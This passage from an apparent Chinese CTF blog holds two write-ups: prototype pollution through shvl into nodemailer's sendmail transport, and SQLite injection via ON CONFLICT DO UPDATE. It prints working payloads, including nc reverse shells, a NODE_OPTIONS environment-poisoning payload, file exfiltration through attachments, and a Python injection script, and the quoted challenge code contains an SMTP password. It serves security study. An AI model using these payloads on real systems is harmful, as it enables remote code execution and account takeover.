&#125;);<br>    &#125;<br>  &#125;);<br>&#125;,<br></code></pre></td></tr></table></figure><p>这里调用的user.signig()函数如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">signin</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">username, password, done</span>) &#123;<br>    sql.<span class="hljs-title function_">query</span>(<br>      <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,<br>      [username, password],<br>      <span class="hljs-keyword">function</span> (<span class="hljs-params">err, res</span>) &#123;<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;error: &quot;</span>, err);<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">done</span>(err, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">done</span>(<span class="hljs-literal">null</span>, res);<br>        &#125;<br>      &#125;<br>    );<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>所以可以得到<code>result[0].username</code>的值即为<code>session.username</code></p><p>因为这题的环境是用docker搭的，没办法直接用vscode调试，所以这里的<code>result</code>的值没办法知道是什么，但猜测是数据库查询返回的结果，其中username是列名，所以我们应该是没办法伪造session的。。:(</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>登陆成功后跳转到admin页面，看样子像一个发送邮件的页面。开始代码审计！</p><p>首先根据路由来到<code>adminController.js</code>的<code>email</code>方法，乍一看好像没有什么利用点。。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">  <span class="hljs-attr">email</span>: <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> contents = &#123;&#125;;<br><br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(req.<span class="hljs-property">body</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> &#123;<br>      shvl.<span class="hljs-title function_">set</span>(contents, key, req.<span class="hljs-property">body</span>[key]);<br>    &#125;);<br><br>    contents.<span class="hljs-property">from</span> = <span class="hljs-string">&#x27;&quot;admin&quot; 2449970596@qq.com&#x27;</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">await</span> <span class="hljs-title function_">send</span>(contents);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Success.&quot;</span>&#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里有一个细节就是引入了shvl库（当时第一次审代码的时候完全没有放在心上，只是觉得有点奇怪而已，以后要多留意这些被引入的库）。</p><p>其中在发信前调用了<code>shvl.set</code>方法，我们根据路径查找到<code>/node_modules/shvl/index&quot;</code>发现如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">set</span>  (object, path, val, obj) &#123;<br>  <span class="hljs-keyword">return</span> !<span class="hljs-regexp">/^(__proto__|constructor|prototype)$/</span>.<span class="hljs-title function_">test</span>(path) &amp;&amp; ((path = path.<span class="hljs-property">split</span> ? path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>) : path.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>)).<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">obj, p</span>) &#123;<br>    <span class="hljs-keyword">return</span> obj[p] = obj[p] || &#123;&#125;;<br>  &#125;, obj = object)[path.<span class="hljs-title function_">pop</span>()] = val), object;<br>&#125;;<br></code></pre></td></tr></table></figure><p>看样子有点像合并函数，但是ban了可以用来原型链污染的所有关键字，所以无法利用。</p><p>其实这里出了点问题，我看网上师傅们的wp上的源码都是只有过滤<code>__proto__</code>而我手上的源码全过滤了，但是在实际测试中发现使用<code>constructor.prototype</code>又能绕过，orz.</p><p>检查package.json里的shvl版本也是2.02，在github上也能看到到了2.03版本的修复中才加上了<code>constructor</code>和<code>prototype</code>。</p><p><img src="/../../img/8-bit%20pub-images/4.png"></p><p>这里就当做只过滤<code>__proto__</code>来进行审计吧</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">set</span>  (object, path, val, obj) &#123;<br>  <span class="hljs-keyword">return</span> !<span class="hljs-regexp">/^(__proto__)$/</span>.<span class="hljs-title function_">test</span>(path) &amp;&amp; ((path = path.<span class="hljs-property">split</span> ? path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>) : path.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>)).<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">obj, p</span>) &#123;<br>    <span class="hljs-keyword">return</span> obj[p] = obj[p] || &#123;&#125;;<br>  &#125;, obj = object)[path.<span class="hljs-title function_">pop</span>()] = val), object;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>这里又get了一个审计小技巧，对于这种在github上开源且有release更新的话可以直接去查看修改了哪些代码，直接定位历史漏洞。</strong></p><p>首先实现使用test进行正则判断，path的参数内是否含有<code>__proto__</code>，所以可以判断这里存在原型链污染漏洞且使用<code>constructor.prototype</code>绕过。（虽然不是很懂后半部分代码的具体含义。。。）</p><p>找到原型链污染的地方后就要寻找利用点了。</p><p>这里有两种寻找利用点的方法</p><p>第一种</p><p>在vscode全局搜索RCE利用点，例如<code>child_process</code>，可以在<code>node_modules\nodemailer\lib\sendmail-transport\index.js</code>里找到如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> spawn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-keyword">const</span> packageData = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../../package.json&#x27;</span>);<br><span class="hljs-keyword">const</span> shared = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../shared&#x27;</span>);<br>.....<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SendmailTransport</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) &#123;<br>        options = options || &#123;&#125;;<br><br>        <span class="hljs-comment">// use a reference to spawn for mocking purposes</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">_spawn</span> = spawn;<br><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = options || &#123;&#125;;<br>......<br></code></pre></td></tr></table></figure><p>继续跟进查看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">try</span> &#123;<br>           sendmail = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_spawn</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span>, args);<br>       &#125; <span class="hljs-keyword">catch</span> (E) &#123;<br>           <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">error</span>(<br>               &#123;<br>                   <span class="hljs-attr">err</span>: E,<br>                   <span class="hljs-attr">tnx</span>: <span class="hljs-string">&#x27;spawn&#x27;</span>,<br>                   messageId<br>               &#125;,<br>               <span class="hljs-string">&#x27;Error occurred while spawning sendmail. %s&#x27;</span>,<br>               E.<span class="hljs-property">message</span><br>           );<br>           <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(E);<br>       &#125;<br></code></pre></td></tr></table></figure><p>跟进<code>this.path</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (options) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span> = options;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (options.<span class="hljs-property">path</span>) &#123;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span> = options.<span class="hljs-property">path</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(options.<span class="hljs-property">args</span>)) &#123;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">args</span> = options.<span class="hljs-property">args</span>;<br>                &#125;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">winbreak</span> = [<span class="hljs-string">&#x27;win&#x27;</span>, <span class="hljs-string">&#x27;windows&#x27;</span>, <span class="hljs-string">&#x27;dos&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>].<span class="hljs-title function_">includes</span>((options.<span class="hljs-property">newline</span> || <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">toLowerCase</span>());<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以在这里看到要给<code>this.path</code>赋值的条件是<code>options</code>的类型要是对象和<code>option</code>的<code>args</code>属性是数组。</p><p>接着要做的是检查如何触发</p><p>回到<code>mail.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> nodemailer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nodemailer&quot;</span>);<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">contents</span>) &#123;<br>  <span class="hljs-keyword">let</span> transporter = nodemailer.<span class="hljs-title function_">createTransport</span>(&#123;<br>    <span class="hljs-attr">service</span>: <span class="hljs-string">&quot;qq&quot;</span>, <span class="hljs-comment">// Plz use your own smtp server for testing</span><br>    <span class="hljs-attr">port</span>: <span class="hljs-number">465</span>,<br>    <span class="hljs-attr">secureConnection</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">auth</span>: &#123;<br>      <span class="hljs-attr">user</span>: <span class="hljs-string">&quot;2449970596@qq.com&quot;</span>,<br>      <span class="hljs-attr">pass</span>: <span class="hljs-string">&quot;qlwwytxigkuzebdf&quot;</span>,<br>    &#125;,<br>  &#125;);<br>  <span class="hljs-keyword">return</span> transporter.<span class="hljs-title function_">sendMail</span>(contents);<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = send;<br></code></pre></td></tr></table></figure><p>这边可以继续跟进的地方是<code>createTransport</code>（没办法逐行debug真麻烦。。还要自己找）</p><p>在<code>node_modules\nodemailer\lib\nodemailer.js</code>中可以找到如下源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">createTransport</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">transporter, defaults</span>) &#123;<br>....<br><br>        <span class="hljs-keyword">if</span> (options.<span class="hljs-property">pool</span>) &#123;<br>            transporter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SMTPPool</span>(options);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.<span class="hljs-property">sendmail</span>) &#123;<br>            transporter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SendmailTransport</span>(options);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.<span class="hljs-property">streamTransport</span>) &#123;<br>            transporter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamTransport</span>(options);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.<span class="hljs-property">jsonTransport</span>) &#123;<br>....<br></code></pre></td></tr></table></figure><p>只要<code>options.sendmail</code>的值为真，就会实例化<code>SendmailTransport</code>类，也就是我们上面要进行原型链污染的类</p><p>至此可以尝试构造原型链污染如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;constructor.prototype.sendmail&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;constructor.prototype.path&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sh&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;constructor.prototype.args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;-c&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;nc ip port -e /bin/sh&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这个poc是用于反弹shell的，因为我的SMTP服务器配置有问题，所以只能这样做。</p><p><img src="/../../img/8-bit%20pub-images/6.png"></p><p><img src="/../../img/8-bit%20pub-images/5.png"></p><p>这边放一下其他师傅通过任意读文获得flag的方式</p><p>在nodemailer文档中发现使用attachments 可以进行任意文件读取</p><p>先把文件写到tmp目录下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;constructor.prototype.sendmail&quot;</span>:<span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;constructor.prototype.path&quot;</span>:<span class="hljs-string">&quot;sh&quot;</span>,<br>    <span class="hljs-string">&quot;constructor.prototype.args&quot;</span>:[<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;/readflag &gt; /tmp/flag.txt&quot;</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>再利用attachments带出</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;to&quot;</span>:<span class="hljs-string">&quot;i@example.com&quot;</span>,<br>    <span class="hljs-string">&quot;subject&quot;</span>:<span class="hljs-string">&quot;flag&quot;</span>,<br>    <span class="hljs-string">&quot;constructor.prototype.attachments&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;flag.txt&quot;</span>,<br>            <span class="hljs-string">&quot;path&quot;</span>:<span class="hljs-string">&quot;/tmp/flag.txt&quot;</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>以下是之前构造错误的原型链，没有双引号，等号当冒号用，nc反弹shell格式出错。。用于提醒自己</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm">&#123;<br>constructor.proto<span class="hljs-keyword">type</span>.path=bash<br>constructor.proto<span class="hljs-keyword">type</span>.args=[nc,ip,port]<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有一个方法是污染原型链，先放个其他师傅的博客，后面再研究</p><blockquote><p>这里就比较直接了，因为nodemailer是有require<code>child_process</code>库的，那么我们可以使用<a href="https://blog.p6.is/Abusing-Environment-Variables/">Abusing Environment Variables (p6.is)</a>方法，污染env和shell，先放payload</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;constructor.prototype.sendmail&quot;</span><span class="hljs-punctuation">:</span> True<span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constructor.prototype.shell&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;node&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constructor.prototype.env.NODE_DEBUG&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;nc ip port -e /bin/bash&#x27;);process.exit();//&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constructor.prototype.env.NODE_OPTIONS&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;-r /proc/self/environ&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>这里污染了环境变量之后，每次以node执行命令的时候，就会加载<code>NODE_OPTIONS</code>选项，从而执行<code>/proc/self/environ</code>中存在的js代码，那么就很简单了，当默认使用发邮件的时候，spawn会调用默认的shell，也就是&#x2F;bin&#x2F;sh</p></blockquote><p>参考资料：</p><p>47.103.121.189&#x2F;2023&#x2F;04&#x2F;20&#x2F;网鼎杯2023线下半决赛突破题errormsg复现&#x2F;</p><p><a href="https://blog.csdn.net/lllffg/article/details/114548517">https://blog.csdn.net/lllffg/article/details/114548517</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023_CISCN_Pollution</title>
    <link href="/2023/06/24/2023CISCN/2023_CISCN_Pollution/"/>
    <url>/2023/06/24/2023CISCN/2023_CISCN_Pollution/</url>
    
    <content type="html"><![CDATA[<h2 id="2023-CISCN-Pollution"><a href="#2023-CISCN-Pollution" class="headerlink" title="2023_CISCN_Pollution"></a>2023_CISCN_Pollution</h2><p>开局经典登录框，一顿瞎试。查看源码可以猜测是使用sql注入，后来主办方也是提醒了在注册处存在sql注入。</p><p>经过注册登录测试可以猜到第一步是需要获得admin的密码。</p><p>在<code>app.js</code>里可以看到下列sql语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">db.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=? AND password=?&quot;</span>,[username,password],<span class="hljs-keyword">function</span>(<span class="hljs-params">err,result</span>)<br><br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=?&quot;</span>, [username], <span class="hljs-keyword">function</span>(<span class="hljs-params">err, row</span>)<br><br><span class="hljs-keyword">let</span> query = <span class="hljs-string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;utils.md5(password)&#125;</span>&#x27;)`</span><br></code></pre></td></tr></table></figure><p>可以看到前两句都进行了预编译，所以无法进行注入，我们把重点放到第三句上。非常简单的单引号闭合，对于我来说难点就在这里使用的是SQLite进行注入，当时在比赛的时候还没接触过这类的sql注入。。。用sqlmap硬跑没跑出来。</p><p>完整sql查询代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> query = <span class="hljs-string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;utils.md5(password)&#125;</span>&#x27;)`</span>;<br>            db.<span class="hljs-title function_">run</span>(query,<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)&#123;<br>              <span class="hljs-keyword">if</span>(err)&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err)<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Error!&#x27;);window.location.href=&#x27;/register&#x27;&lt;/script&gt;&quot;</span>);<br>              &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Register successed&#x27;);window.location.href=&#x27;/login&#x27;&lt;/script&gt;&quot;</span>);<br>              &#125;<br></code></pre></td></tr></table></figure><p>可以看到对于语句执行错误或者成功会统一输出<code>Error</code>或者<code>success</code>，所以这里没办法使用报错注入或者直接联合查询拖库等查看admin密码。</p><p>这里的突破点是直接使用UPDATE语句来更新admin的密码。</p><p>经过测试常规的UPDATE语句没办法直接更新用户的密码，这里使用sqllite里的另一句更新数据的语句</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-params">...</span>..<span class="hljs-keyword">on</span> CONFLICT <span class="hljs-keyword">DO</span><span class="hljs-params">...</span>..<br></code></pre></td></tr></table></figure><p>所以构造如下注入语句</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;, &#x27;</span>md5(<span class="hljs-number">123456</span>)<span class="hljs-string">&#x27;) on CONFLICT DO UPDATE password = &#x27;</span>md5(<span class="hljs-number">123456</span>)<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>据此可以使用python写出如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">SQLinjection</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/register&#x27;</span><br>    passwd=<span class="hljs-string">&#x27;123456&#x27;</span><br>    <span class="hljs-built_in">hash</span>=passwd.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">f&quot;admin&#x27;,&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27;) on CONFLICT DO UPDATE SET password=&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27; --+&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected successfully!\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected failed&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>    SQLinjection(url)<br></code></pre></td></tr></table></figure><p>注入成功后就进入<code>/admin</code>页面了，然而web页面什么都没有。开始审计源码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/admin&quot;</span>,utils.<span class="hljs-property">checkIsAdmin</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res,next</span>)&#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;GET&quot;</span>)&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>,&#123;<span class="hljs-string">&#x27;username&#x27;</span>:req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>&#125;)<br>  &#125;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Info</span> =&#123;<br>      <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>      <span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Try2HackMe!&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">try</span>&#123;<br>      utils.<span class="hljs-title function_">extend</span>(<span class="hljs-title class_">Info</span>, req.<span class="hljs-property">body</span>);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-title class_">Info</span>.<span class="hljs-property">username</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-title class_">Info</span>.<span class="hljs-property">message</span>&#125;);<br>    &#125;<span class="hljs-keyword">catch</span>(err)&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span 